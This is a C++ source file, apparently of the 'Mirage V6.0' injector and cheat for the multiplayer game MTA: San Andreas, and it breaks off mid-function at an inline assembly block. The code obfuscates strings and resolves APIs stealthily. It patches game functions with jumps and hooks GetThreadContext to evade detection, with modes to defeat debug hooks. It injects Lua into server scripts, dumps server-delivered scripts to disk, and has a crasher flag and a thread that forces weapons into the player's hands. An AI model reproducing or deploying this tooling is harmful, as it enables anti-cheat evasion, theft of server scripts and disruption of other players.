#ifndef _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING
#define _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING
#endif
#ifndef _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING
#define _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING
#endif
#ifndef _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#endif
#pragma warning (disable : 4244)
#define LOG_NAME xorstr_("Mirage.log") // Имя лог файла
#define WITH_LOGGING // Закоментить чтобы отключить вывод в лог файл
#define MIRAGE_VERSION xorstr_("V6.0") // Версия инжектора
#define TO_ELEMENTID(x) ((ElementID) reinterpret_cast < unsigned long > (x) )
#include <Windows.h>
#include <stdio.h>
#include <filesystem>
#include <mutex>
#include <fstream>
#include <sstream>
#include <iostream>
#include <thread>
#include <string>
#include <shlobj_core.h>
#include <unordered_set>
#include <unordered_map>
#include <array>
#include <direct.h>
#include <vector>
#include <map>
#include <codecvt>
#include <tuple>
#include "sigscan.h"
#include "xorstr.h"
#include "Registry.h"
#include "HWBP.h"
#include "HWID.h"
#include <intrin.h>
#include "MinHook.h"
#include "CVector.h"
#include "CVector2D.h"
#include <random>
#include "Nirmata.h"
#include "magic_enum/include/magic_enum.hpp"
#include "WepTypes.h"
#include <winternl.h>
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "libMinHook.x86.lib")
#pragma comment(lib, "Winmm.lib")
#include "NetAPI/CNet.h"
#include "NetAPI/Packets.h"
#include "NetAPI/SyncStructures.h"
#include "BreakPoint.h"
typedef void(__cdecl* ptrWriteCameraOrientation)(const CVector& vecPositionBase, NetBitStreamInterface& BitStream);
ptrWriteCameraOrientation callWriteCameraOrientation = nullptr;
void __stdcall LogInFile(std::string log_name, const char* log, ...);
#include "IAT.h"
CNet* g_pNet = nullptr;
bool crasher = false;
bool cursed_voice = false;
bool DbgHook = true; // по умолчанию разрешаем работу дебаг хуков
void* CNetAPI = nullptr;
bool HideCall = false;
BYTE exit_prologue[5] = { 0x0 };
typedef BOOL(__stdcall* ptrGetThreadContext)(HANDLE hThread, LPCONTEXT lpContext);
ptrGetThreadContext callGetThreadContext = nullptr;
BOOL __stdcall hookGetThreadContext(HANDLE hThread, LPCONTEXT lpContext);
typedef HMODULE(WINAPI* ptrLoadLibraryExW)(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
ptrLoadLibraryExW callLoadLibraryExW = nullptr;
BYTE getproc_prologue[5];
void SignatureScanner();
typedef void(__cdecl* ptrScreenShot)(const char* szParameters);
ptrScreenShot callScreenShot = nullptr;
void* CLocalGUI = nullptr;
typedef bool(__thiscall* ptrIsChatBoxInputEnabled)(void* ECX);
ptrIsChatBoxInputEnabled callIsChatBoxInputEnabled = nullptr;
typedef bool(__cdecl* f_SendChat)(const char* szCommand, const char* szArguments, bool bHandleRemotely, bool bHandled, bool bIsScriptedBind, bool AllowBinded);
f_SendChat sendMTAChat = nullptr;
typedef int(__cdecl* t_LuaLoadBuffer)(void* L, const char* buff, size_t sz, const char* name);
t_LuaLoadBuffer callLuaLoadBuffer = nullptr;
typedef int(__cdecl* ptrAddDebugHook)(void* luaVM);
ptrAddDebugHook callAddDebugHook = nullptr;
typedef int(__cdecl* ptrRemoveDebugHook)(void* luaVM);
ptrRemoveDebugHook callRemoveDebugHook = nullptr;
using lua_CFunction = int(__cdecl*)(void*);
#define LUA_GLOBALSINDEX (-10002)
typedef void(__cdecl* lua_pushcclosure)(void* L, lua_CFunction fn, int n);
lua_pushcclosure call_pushcclosure = nullptr;
typedef void(__cdecl* lua_setfield)(void* L, int idx, const char* k);
lua_setfield call_setfield = nullptr;
typedef void(__cdecl* lua_pushboolean)(void* L, int bValue);
lua_pushboolean call_pushboolean = nullptr;
typedef int(__cdecl* lua_toboolean)(void* L, int idx);
lua_toboolean call_toboolean = nullptr;
typedef int(__cdecl* lua_strlen)(void* L);
lua_strlen call_strlen = nullptr;
typedef const char* (__cdecl* lua_tostring)(void* L, int idx, unsigned int* len);
lua_tostring call_tostring = nullptr;
typedef void(__cdecl* lua_pushnumber)(void* L, long double n);
lua_pushnumber call_pushnumber = nullptr;
typedef void(__cdecl* lua_pushstring)(void* L, const char* s);
lua_pushstring call_pushstring = nullptr;
typedef void* (__cdecl* plua_touserdata)(void* L, int idx);
plua_touserdata call_touserdata = nullptr;
typedef int (__cdecl *ptr_lua_remove)(void* L, int a2);
ptr_lua_remove call_lua_remove = nullptr;
typedef int (__cdecl* lua_objlen)(void* L, int a2);
lua_objlen call_objlen = nullptr;
typedef int(__cdecl* lua_rawgeti)(void* L, int a2, int a3);
lua_rawgeti call_rawgeti = nullptr;
typedef int(__cdecl* lua_rawseti)(void* L, int a2, int a3);
lua_rawseti call_rawseti = nullptr;
typedef void* (__cdecl* lua_settop)(void* L, int a2);
lua_settop call_settop = nullptr;
int __cdecl hkLuaLoadBuffer(void* L, char* buff, size_t sz, const char* name);

BYTE loadlib_prologue[5] = { 0x0 };
BYTE icf_prologue[4] = { 0x0 };
BYTE logger_prologue[4] = { 0x0 };
BYTE packet_prologue[5] = { 0x0 };
BYTE violation1_prologue[8] = { 0x0 };
BYTE violation2_prologue[8] = { 0x0 };
BYTE violation3_prologue[8] = { 0x0 };
BYTE violation4_prologue[8] = { 0x0 };
BYTE gamestart_prologue[8] = { 0x0 };
BYTE loadbuff_prologue[6] = { 0x0 };
BYTE load_prologue[6] = { 0x0 };
BYTE thread_prologue[5] = { 0x0 };
BYTE pmsg_prologue[8] = { 0x0 };
BYTE vertex_static_prologue[5] = { 0x0 };
BYTE vertex_dynamic_prologue[5] = { 0x0 };

bool OneClientLoad = false;

void lua_register(void* L, const char* func_name, lua_CFunction f)
{
	call_pushcclosure(L, (f), 1);
	call_setfield(L, LUA_GLOBALSINDEX, (func_name));
}
FARPROC GetProcedure(const char* szModuleName, const char* szProcName)
{
	PEB* pPeb = (PEB*)__readfsdword(0x30);
	PEB_LDR_DATA* pLdr = pPeb->Ldr;
	LIST_ENTRY* pListHead = &pLdr->InMemoryOrderModuleList;
	LIST_ENTRY* pListEntry = pListHead->Flink;

	while (pListEntry != pListHead)
	{
		LDR_DATA_TABLE_ENTRY* pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		if (pEntry->FullDllName.Buffer)
		{
			wchar_t* pDllName = pEntry->FullDllName.Buffer;
			wchar_t* pLastSlash = nullptr;

			for (wchar_t* p = pDllName; *p; p++)
			{
				if (*p == L'\\') pLastSlash = p;
			}

			if (pLastSlash) pDllName = pLastSlash + 1;

			bool bMatch = true;
			for (int i = 0; szModuleName[i]; i++)
			{
				if ((pDllName[i] | 0x20) != (szModuleName[i] | 0x20))
				{
					bMatch = false;
					break;
				}
			}

			if (bMatch)
			{
				HMODULE hModule = (HMODULE)pEntry->DllBase;
				IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)hModule;
				IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + pDosHeader->e_lfanew);
				IMAGE_EXPORT_DIRECTORY* pExportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule +
					pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

				DWORD* pNameRVAs = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfNames);
				WORD* pOrdinals = (WORD*)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);
				DWORD* pFuncRVAs = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfFunctions);

				for (DWORD i = 0; i < pExportDir->NumberOfNames; i++)
				{
					char* pFuncName = (char*)((BYTE*)hModule + pNameRVAs[i]);

					bool bFuncMatch = true;
					for (int j = 0; szProcName[j]; j++)
					{
						if (pFuncName[j] != szProcName[j])
						{
							bFuncMatch = false;
							break;
						}
					}

					if (bFuncMatch)
					{
						WORD wOrdinal = pOrdinals[i];
						return (FARPROC)((BYTE*)hModule + pFuncRVAs[wOrdinal]);
					}
				}
			}
		}

		pListEntry = pListEntry->Flink;
	}

	return nullptr;
}
namespace fs = std::filesystem;

enum class LuaInjectionType
{
	METHOD_LUA_L_LOAD = 0,
	METHOD_LUA_L_LOADBUFFER = 1,
};

enum class ForkVersion
{
	FORK_VERSION_1_6 = 0,
	FORK_VERSION_1_5 = 1,
};

enum class HookingType
{
	HWBP_HOOK = 0,
	INLINE_JUMP = 1,
	IAT = 2,
};

enum class DllInjectionType
{
	MMAP = 0,
	SET_WINDOWS_HOOK = 1,
};

enum class FuckDbgHooksMode
{
	ALLOW_DBG_HOOKS = 0,
	FUCK_DBG_HOOKS = 1,
	PROTECTED_MODE = 2,
	STEALTH_MODE = 3,
};

typedef struct
{
	LuaInjectionType injection_type;
	ForkVersion fork_version;
	FuckDbgHooksMode fuck_dbg_hooks;
	HookingType hwbp_hooking;
	bool Dumper;
	std::string dump_resource_name;
	bool DumpAllScripts;
	DllInjectionType dll_injection_type;

} MIRAGE_CONFIG, *PMIRAGE_CONFIG;
MIRAGE_CONFIG mirage;

typedef struct
{
	std::wstring target_script;
	std::wstring our_script;
} LVM, *PLVM;

bool hwbp_end1 = false;
bool hwbp_end2 = false;

std::vector<LVM> lua_injection_list;

std::wstring lua_scripts_dir = L"";
std::wstring mapped_image_dir = L"";
std::wstring mirage_config_dir = L"";

// Лёгкая функция преобразования для символов, предполагающая базовый латинский набор.
inline wchar_t to_lower_wchar(wchar_t ch) {
	return (ch >= L'A' && ch <= L'Z') ? (ch + (L'a' - L'A')) : ch;
}

// Оптимизированный алгоритм поиска подстроки без учёта регистра для std::wstring
bool w_findStringIC(const std::wstring& haystack, const std::wstring& needle) {
	const size_t hLen = haystack.size();
	const size_t nLen = needle.size();

	if (nLen == 0) return true;        // Пустая подстрока считается найденной
	if (nLen > hLen) return false;     // Если искомая строка длиннее исходной, совпадения не будет

	// Формирование таблицы смещений для символов needle (без последнего символа)
	std::unordered_map<wchar_t, size_t> shift;
	for (size_t i = 0; i < nLen - 1; ++i) {
		wchar_t key = to_lower_wchar(needle[i]);
		shift[key] = nLen - 1 - i;
	}

	size_t i = 0;
	while (i <= hLen - nLen) {
		int j = static_cast<int>(nLen) - 1;
		// Сравнение символов с конца needle
		while (j >= 0 && to_lower_wchar(haystack[i + j]) == to_lower_wchar(needle[j])) {
			--j;
		}
		if (j < 0) {
			return true; // Совпадение найдено
		}
		// Определяем смещение по последнему символу окна
		wchar_t current = to_lower_wchar(haystack[i + nLen - 1]);
		size_t shiftValue = nLen; // Значение по умолчанию, если символ не найден в таблице
		auto it = shift.find(current);
		if (it != shift.end()) {
			shiftValue = it->second;
		}
		i += shiftValue;
	}
	return false;
}
// Оптимизированная функция преобразования символа в нижний регистр для ASCII
inline char to_lower_ascii(char c) {
	return (c >= 'A' && c <= 'Z') ? c + 32 : c;
}

// Оптимизированный алгоритм поиска подстроки без учёта регистра (Boyer-Moore-Horspool)
bool findStringIC(const std::string& haystack, const std::string& needle) {
	const size_t hLen = haystack.size();
	const size_t nLen = needle.size();

	if (nLen == 0) return true;       // Пустая подстрока считается найденной
	if (nLen > hLen) return false;    // Если искомая строка длиннее исходной, совпадения не будет

	// Формирование таблицы смещений для всех 256 символов (ASCII)
	std::array<size_t, 256> shift;
	shift.fill(nLen);
	for (size_t i = 0; i < nLen - 1; ++i) {
		shift[static_cast<unsigned char>(to_lower_ascii(needle[i]))] = nLen - 1 - i;
	}

	size_t i = 0;
	while (i <= hLen - nLen) {
		int j = static_cast<int>(nLen) - 1;
		// Сравнение с конца искомой строки
		while (j >= 0 && to_lower_ascii(haystack[i + j]) == to_lower_ascii(needle[j])) {
			--j;
		}
		if (j < 0) {
			return true;  // Найдено полное совпадение
		}
		// Смещаем индекс согласно таблице смещений
		i += shift[static_cast<unsigned char>(to_lower_ascii(haystack[i + nLen - 1]))];
	}
	return false;
}
std::string cp1251_to_utf8(const char* str)
{
	std::string res;
	WCHAR* ures = NULL;
	char* cres = NULL;
	int result_u = MultiByteToWideChar(1251, 0, str, -1, 0, 0);
	if (result_u != 0)
	{
		ures = new WCHAR[result_u];
		if (MultiByteToWideChar(1251, 0, str, -1, ures, result_u))
		{
			int result_c = WideCharToMultiByte(CP_UTF8, 0, ures, -1, 0, 0, 0, 0);
			if (result_c != 0)
			{
				cres = new char[result_c];
				if (WideCharToMultiByte(CP_UTF8, 0, ures, -1, cres, result_c, 0, 0))
				{
					res = cres;
				}
			}
		}
	}
	delete[] ures, cres;
	return res;
}
std::string utf8_to_cp1251(const char* str)
{
	std::string res;
	WCHAR* ures = NULL;
	char* cres = NULL;
	int result_u = MultiByteToWideChar(CP_UTF8, 0, str, -1, 0, 0);
	if (result_u != 0)
	{
		ures = new WCHAR[result_u];
		if (MultiByteToWideChar(CP_UTF8, 0, str, -1, ures, result_u))
		{
			int result_c = WideCharToMultiByte(1251, 0, ures, -1, 0, 0, 0, 0);
			if (result_c != 0)
			{
				cres = new char[result_c];
				if (WideCharToMultiByte(1251, 0, ures, -1, cres, result_c, 0, 0))
				{
					res = cres;
				}
			}
		}
	}
	delete[] ures, cres;
	return res;
}
void RemoveOldLog()
{
#ifdef WITH_LOGGING
	char new_dir[600];
	memset(new_dir, 0, sizeof(new_dir));
	sprintf(new_dir, xorstr_("%ls\\%s"), lua_scripts_dir.c_str(), LOG_NAME);
	FILE* hFile = fopen(new_dir, xorstr_("rb"));
	if (hFile) { fclose(hFile); DeleteFileA(new_dir); }
#endif
}
void __stdcall LogInFile(std::string log_name, const char* log, ...)
{
#ifdef WITH_LOGGING
	char new_dir[600];
	memset(new_dir, 0, sizeof(new_dir));
	sprintf(new_dir, xorstr_("%ls\\%s"), lua_scripts_dir.c_str(), log_name.c_str());
	FILE* hFile = fopen(new_dir, xorstr_("a+"));
	if (hFile)
	{
		time_t t = std::time(0); tm* now = std::localtime(&t);
		char tmp_stamp[600]; memset(tmp_stamp, 0, sizeof(tmp_stamp));
		sprintf(tmp_stamp, xorstr_("[%d:%d:%d]"), now->tm_hour, now->tm_min, now->tm_sec);
		strcat(tmp_stamp, std::string(" " + std::string(log)).c_str());
		va_list arglist; va_start(arglist, log); vfprintf(hFile, tmp_stamp, arglist);
		va_end(arglist); fclose(hFile);
	}
#endif
}
DWORD MakeJump(const DWORD jmp_address, const DWORD hookAddr, BYTE* prologue, const size_t prologue_size, bool enableTrampoline = false)
{
	__try
	{
		DWORD old_prot = 0;
		if (prologue == nullptr) return 0x0;

		// Изменяем защиту памяти исходного адреса
		VirtualProtect((void*)jmp_address, prologue_size, PAGE_EXECUTE_READWRITE, &old_prot);

		// Сохраняем оригинальный пролог
		memcpy(prologue, (void*)jmp_address, prologue_size);

		// Подготавливаем инструкции перехода (jmp) к hook адресу
		BYTE addrToBYTEs[5] = { 0xE9, 0x90, 0x90, 0x90, 0x90 };
		DWORD relOffset = hookAddr - jmp_address - 5;
		memcpy(&addrToBYTEs[1], &relOffset, 4);
		memcpy((void*)jmp_address, addrToBYTEs, 5);

		// Если trampoline не нужен, восстанавливаем защиту и выходим
		if (!enableTrampoline)
		{
			VirtualProtect((void*)jmp_address, prologue_size, old_prot, &old_prot);
			return 0x0; // Возвращаем 0, чтобы обозначить, что trampoline не выделялся
		}

		// Вычисляем размер для trampoline:
		// Всегда должны быть 5 байт для инструкции jmp, 
		// плюс дополнительное пространство, если оригинальный пролог больше 5 байт.
		size_t trampolineSize = 5 + ((prologue_size > 5) ? (prologue_size - 5) : 0);
		PVOID Trampoline = VirtualAlloc(0, trampolineSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (Trampoline == nullptr)
		{
			VirtualProtect((void*)jmp_address, prologue_size, old_prot, &old_prot);
			return 0x0;
		}

		BYTE trampolineJmp[5] = { 0xE9, 0x90, 0x90, 0x90, 0x90 };

		// Если пролог занимает больше 5 байт, копируем оставшуюся часть и устанавливаем инструкцию jmp
		if (prologue_size > 5)
		{
			// Записываем NOP-ы после установленного jmp в оригинальном коде
			BYTE nop = 0x90;
			for (size_t x = 0; x < (prologue_size - 5); x++) {
				memcpy((void*)(jmp_address + 5 + x), &nop, 1);
			}
			// Копируем часть оригинального кода, начиная с 3-го байта (как в вашем варианте)
			memcpy(Trampoline, &prologue[3], (prologue_size - 3));

			// Вычисляем смещение для перехода обратно к оставшейся части оригинального кода
			DWORD delta = (jmp_address + prologue_size) - (((DWORD)Trampoline + (prologue_size - 3)) + 5);
			memcpy(&trampolineJmp[1], &delta, 4);
			// Устанавливаем команду перехода в конце trampoline
			memcpy((void*)((DWORD)Trampoline + (prologue_size - 3)), trampolineJmp, 5);
		}
		else
		{
			// Если пролог занимает 5 байт или меньше, достаточно одной jmp-инструкции в trampoline
			DWORD delta = (jmp_address + prologue_size) - ((DWORD)Trampoline + 5);
			memcpy(&trampolineJmp[1], &delta, 4);
			memcpy(Trampoline, trampolineJmp, 5);
		}

		// Восстанавливаем защиту памяти исходного адреса
		VirtualProtect((void*)jmp_address, prologue_size, old_prot, &old_prot);
		return (DWORD)Trampoline;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return 0x0;
	}
}
bool RestorePrologue(DWORD addr, BYTE* prologue, size_t prologue_size, DWORD trampoline = 0x0)
{
	__try
	{
		if (prologue == nullptr)
			return false;

		DWORD old_prot = 0;
		VirtualProtect((void*)addr, prologue_size, PAGE_EXECUTE_READWRITE, &old_prot);
		memcpy((void*)addr, prologue, prologue_size);
		VirtualProtect((void*)addr, prologue_size, old_prot, &old_prot);

		// Если trampoline не равен нулевому указателю, освобождаем выделенную для него память
		if (trampoline != 0)
		{
			VirtualFree((LPVOID)trampoline, 0, MEM_RELEASE);
		}

		return true;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return false;
	}
}
std::string CvWideToAnsi(const std::wstring& wstr)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;
	return converterX.to_bytes(wstr);
}
// Проверка, является ли буфер UTF-8
bool IsUtf8(const std::string& str) 
{
	int c, i, ix, n, j;
	for (i = 0, ix = str.length(); i < ix; i++) 
	{
		c = (unsigned char)str[i];
		if (c <= 0x7f) n = 0;
		else if ((c & 0xE0) == 0xC0) n = 1;
		else if ((c & 0xF0) == 0xE0) n = 2;
		else if ((c & 0xF8) == 0xF0) n = 3;
		else return false;
		for (j = 0; j < n && i < ix; j++) 
		{
			if ((++i == ix) || (((unsigned char)str[i] & 0xC0) != 0x80)) return false;
		}
	}
	return true;
}
typedef struct LoadS {
	char* s;
	size_t size;
} LoadS;
typedef const char* (*lua_Reader) (void* L, void* ud, size_t* sz);
typedef int(__cdecl* ptr_lua_load)(void* L, lua_Reader reader, void* data, const char* chunkname);
ptr_lua_load call_lua_load = nullptr;
static const char* getS(void* L, void* ud, size_t* size)
{
	LoadS* ls = (LoadS*)ud;
	(void)L;
	if (ls->size == 0) return NULL;
	*size = ls->size;
	ls->size = 0;
	return ls->s;
}
bool IsFileExist(std::string file_name)
{
	FILE* hFile = fopen(file_name.c_str(), "rb");
	if (hFile != nullptr)
	{
		fclose(hFile);
		return true;
	}
	return false;
}
bool __stdcall IsDirectoryExists(const std::string& dirName_in)
{
	DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
	if (ftyp == INVALID_FILE_ATTRIBUTES) return false;
	if (ftyp & FILE_ATTRIBUTE_DIRECTORY) return true;
	return false;
};
std::string CleanScriptName(std::string str)
{
	std::string ans = str + xorstr_("\\");;
	std::string delimiter = xorstr_("\\");
	size_t pos = 0; std::string token;
	while ((pos = ans.find(delimiter)) != std::string::npos)
	{
		token = ans.substr(0, pos);
		ans.erase(0, pos + delimiter.length());
	}
	return token;
}
std::vector<std::vector<char>> dumpedChunks;
std::unordered_set<uint32_t> dumpedChunkChecksums;
// Пример простой функции вычисления контрольной суммы
uint32_t CalculateChecksum(const char* buff, size_t sz) {
	uint32_t checksum = 0;
	for (size_t i = 0; i < sz; ++i) {
		checksum = checksum * 31 + static_cast<unsigned char>(buff[i]);
	}
	return checksum;
}
void RemoveOldDumpedScripts(std::string dir_name)
{
	char cwd[500]; memset(cwd, 0, sizeof(cwd));
	sprintf(cwd, xorstr_("%ls\\%s"), lua_scripts_dir.c_str(), dir_name.c_str());
	if (!IsDirectoryExists(cwd)) CreateDirectoryA(cwd, 0);
	else
	{
		std::filesystem::remove_all(cwd);
		CreateDirectoryA(cwd, 0);
	}
}
void DumpScript(std::string dir_name, std::string name, char* buff, size_t sz)
{
	static int ictr = 1;
	char ctr[10]; memset(ctr, 0, sizeof(ctr));
	sprintf(ctr, xorstr_("a%d_"), ictr);
	std::string clean_name = CleanScriptName(name);
	char cwd[500]; memset(cwd, 0, sizeof(cwd));
	sprintf(cwd, xorstr_("%ls\\%s"), lua_scripts_dir.c_str(), dir_name.c_str());
	std::string script_path = cwd + std::string(xorstr_("\\")) + (ctr + clean_name);
	FILE* hFile = fopen(script_path.c_str(), xorstr_("wb"));
	if (hFile != nullptr)
	{
		fwrite(buff, 1, sz, hFile);
		fclose(hFile);
	}
	else LogInFile(LOG_NAME, xorstr_("[ERROR] Can`t dump file: %s\n"), script_path.c_str());
	ictr++;
}
// Функция, которая проверяет, не является ли текущий чанк дубликатом
void DumpIfNotDuplicate(const char* path, const char* name, char* buff, size_t sz) {
	uint32_t currentChecksum = CalculateChecksum(buff, sz);

	// Если контрольная сумма уже встречалась, пропускаем дамп
	if (dumpedChunkChecksums.find(currentChecksum) != dumpedChunkChecksums.end()) {
		return; // Чанк уже существует
	}

	// Сохраняем контрольную сумму, чтобы избежать дубликатов в будущем
	dumpedChunkChecksums.insert(currentChecksum);

	// Сохраняем данные чанка в вектор
	std::vector<char> chunk(buff, buff + sz);
	dumpedChunks.push_back(chunk);

	// Вызываем оригинальную функцию дампа
	DumpScript(path, name, buff, sz);
}
// Полный маппинг строковых значений на виртуальные коды клавиш
std::unordered_map<std::string, WORD> keyMap = {
	{"LMB", 0x1 }, {"RMB", 0x2 },
	// Алфавитные клавиши
	{"A", 'A'}, {"B", 'B'}, {"C", 'C'}, {"D", 'D'}, {"E", 'E'}, {"F", 'F'},
	{"G", 'G'}, {"H", 'H'}, {"I", 'I'}, {"J", 'J'}, {"K", 'K'}, {"L", 'L'},
	{"M", 'M'}, {"N", 'N'}, {"O", 'O'}, {"P", 'P'}, {"Q", 'Q'}, {"R", 'R'},
	{"S", 'S'}, {"T", 'T'}, {"U", 'U'}, {"V", 'V'}, {"W", 'W'}, {"X", 'X'},
	{"Y", 'Y'}, {"Z", 'Z'},

	// Цифровые клавиши
	{"0", '0'}, {"1", '1'}, {"2", '2'}, {"3", '3'}, {"4", '4'},
	{"5", '5'}, {"6", '6'}, {"7", '7'}, {"8", '8'}, {"9", '9'},

	// Функциональные клавиши
	{"F1", VK_F1}, {"F2", VK_F2}, {"F3", VK_F3}, {"F4", VK_F4},
	{"F5", VK_F5}, {"F6", VK_F6}, {"F7", VK_F7}, {"F8", VK_F8},
	{"F9", VK_F9}, {"F10", VK_F10}, {"F11", VK_F11}, {"F12", VK_F12},

	// Специальные клавиши
	{"LSHIFT", VK_LSHIFT}, {"RSHIFT", VK_RSHIFT},
	{"LCTRL", VK_LCONTROL}, {"RCTRL", VK_RCONTROL},
	{"LALT", VK_LMENU}, {"RALT", VK_RMENU},
	{"SPACE", VK_SPACE}, {"ENTER", VK_RETURN},
	{"BACKSPACE", VK_BACK}, {"TAB", VK_TAB},
	{"CAPSLOCK", VK_CAPITAL}, {"ESCAPE", VK_ESCAPE},
	{"LEFT", VK_LEFT}, {"UP", VK_UP}, {"RIGHT", VK_RIGHT}, {"DOWN", VK_DOWN},
	{"PAGEUP", VK_PRIOR}, {"PAGEDOWN", VK_NEXT}, {"HOME", VK_HOME}, {"END", VK_END},
	{"INSERT", VK_INSERT}, {"DELETE", VK_DELETE},
	{"NUMLOCK", VK_NUMLOCK}, {"SCROLLLOCK", VK_SCROLL},

	// Numpad клавиши
	{"NUMPAD0", VK_NUMPAD0}, {"NUMPAD1", VK_NUMPAD1}, {"NUMPAD2", VK_NUMPAD2},
	{"NUMPAD3", VK_NUMPAD3}, {"NUMPAD4", VK_NUMPAD4}, {"NUMPAD5", VK_NUMPAD5},
	{"NUMPAD6", VK_NUMPAD6}, {"NUMPAD7", VK_NUMPAD7}, {"NUMPAD8", VK_NUMPAD8},
	{"NUMPAD9", VK_NUMPAD9}, {"MULTIPLY", VK_MULTIPLY}, {"ADD", VK_ADD},
	{"SEPARATOR", VK_SEPARATOR}, {"SUBTRACT", VK_SUBTRACT}, {"DECIMAL", VK_DECIMAL},
	{"DIVIDE", VK_DIVIDE},

	// Дополнительные символы
	{"SEMICOLON", VK_OEM_1}, {"PLUS", VK_OEM_PLUS}, {"COMMA", VK_OEM_COMMA},
	{"MINUS", VK_OEM_MINUS}, {"PERIOD", VK_OEM_PERIOD}, {"SLASH", VK_OEM_2},
	{"TILDE", VK_OEM_3}, {"LEFTBRACKET", VK_OEM_4}, {"BACKSLASH", VK_OEM_5},
	{"RIGHTBRACKET", VK_OEM_6}, {"QUOTE", VK_OEM_7}
};
void EmulateKeyPress(WORD vk_key, bool press, bool block_input = true)
{
	static HWND hwnd = FindWindowA(NULL, xorstr_("UKRAINE GTA"));
	if (hwnd == nullptr) hwnd = FindWindowA(NULL, xorstr_("MTA: San Andreas"));
	if (hwnd != nullptr)
	{
		/*if (callIsChatBoxInputEnabled != nullptr && CLocalGUI != nullptr)
		{
			if (callIsChatBoxInputEnabled(CLocalGUI) && block_input) return;
		}*/

		// Получаем скан-код
		UINT scan_code = MapVirtualKeyA(vk_key, MAPVK_VK_TO_VSC);
		bool is_extended = (vk_key == VK_RMENU || vk_key == VK_RCONTROL || vk_key == VK_NUMLOCK ||
			vk_key == VK_INSERT || vk_key == VK_DELETE || vk_key == VK_HOME ||
			vk_key == VK_END || vk_key == VK_PRIOR || vk_key == VK_NEXT ||
			vk_key == VK_UP || vk_key == VK_DOWN || vk_key == VK_LEFT ||
			vk_key == VK_RIGHT || vk_key == VK_DIVIDE || vk_key == VK_NUMPAD0 ||
			vk_key == VK_NUMPAD1 || vk_key == VK_NUMPAD2 || vk_key == VK_NUMPAD3 ||
			vk_key == VK_NUMPAD4 || vk_key == VK_NUMPAD5 || vk_key == VK_NUMPAD6 ||
			vk_key == VK_NUMPAD7 || vk_key == VK_NUMPAD8 || vk_key == VK_NUMPAD9);

		// Формируем lParam
		LPARAM lParam = (1 & 0xFFFF); // Число повторов, обычно 1 для эмуляции нажатия
		lParam |= (scan_code << 16); // Код сканирования
		if (is_extended) lParam |= (1 << 24); // Флаг расширенной клавиши

		// Установка флагов для нажатия/отпускания
		if (press)
		{
			lParam &= ~(1 << 30); // Предыдущее состояние = 0 (клавиша была отпущена)
			lParam &= ~(1 << 31); // Состояние перехода = 0 (нажатие клавиши)
		}
		else
		{
			lParam |= (1 << 30); // Предыдущее состояние = 1 (клавиша была нажата)
			lParam |= (1 << 31); // Состояние перехода = 1 (отпускание клавиши)
		}

		// Отправляем сообщение
		if (vk_key == VK_LMENU || vk_key == VK_RMENU) // Используем WM_SYSKEYDOWN/WM_SYSKEYUP для клавиш Alt
		{
			if (press)
				PostMessageA(hwnd, WM_SYSKEYDOWN, vk_key, lParam);
			else
				PostMessageA(hwnd, WM_SYSKEYUP, vk_key, lParam);
		}
		else // Используем WM_KEYDOWN/WM_KEYUP для всех остальных клавиш
		{
			if (press)
				PostMessageA(hwnd, WM_KEYDOWN, vk_key, lParam);
			else
				PostMessageA(hwnd, WM_KEYUP, vk_key, lParam);
		}
	}
}
HANDLE hSniperThread = nullptr;
#define WEAPON_SNIPERRIFLE   34
#define MODEL_SNIPER         358

// --- глобальные константы адресов ---
#define ADDR_PLAYER_PED      0xB6F5F0
#define PED_WEAPONS_OFFSET   0x5A0
#define PED_WEAPON_SIZE      0x1C
#define PED_ACTIVE_SLOT      0x718
#define PED_CUR_WEAPON_ID    0x740

// --- типы оригинальных игровых функций ---
typedef void(__thiscall* GiveWeapon_t)(void* ped, int wep, unsigned ammo, bool equip);
typedef void(__thiscall* SetCurrentWep_t)(void* ped, int wep);
typedef void(__cdecl* RequestModel_t)(int model, int flags);
typedef void(__cdecl* LoadAllReq_t)(bool onlyPriority);
typedef void(__cdecl* SetModelDel_t)(int model);

static GiveWeapon_t   GiveWeapon = (GiveWeapon_t)0x5E6080;
static SetCurrentWep_t SetCurrentWeapon = (SetCurrentWep_t)0x5E6280;
static RequestModel_t RequestModel = (RequestModel_t)0x4087E0;
static LoadAllReq_t   LoadAllRequested = (LoadAllReq_t)0x4096C0;
static SetModelDel_t  SetModelDeletable = (SetModelDel_t)0x40ADA0;
DWORD WINAPI SniperThread(LPVOID)
{
	while (true)
	{
		void* player = *reinterpret_cast<void**>(ADDR_PLAYER_PED);
		if (player)
		{
			BYTE slot = *reinterpret_cast<BYTE*>(
				reinterpret_cast<std::uintptr_t>(player) + PED_ACTIVE_SLOT);

			// 1. Гарантируем валидность слота
			if (slot < 13)
			{
				std::uintptr_t weaponBase = reinterpret_cast<std::uintptr_t>(player) +
					PED_WEAPONS_OFFSET + slot * PED_WEAPON_SIZE;

				int weaponType = *reinterpret_cast<int*>(weaponBase);
				DWORD& totalAmmo = *reinterpret_cast<DWORD*>(weaponBase + 0xC);

				if (weaponType != WEAPON_SNIPERRIFLE || totalAmmo < 2)
				{
					RequestModel(MODEL_SNIPER, 2);
					LoadAllRequested(false);
					
					// 2. Передаём this в ECX вручную для полной гарантии (__declspec(naked) вариант)
					__asm {
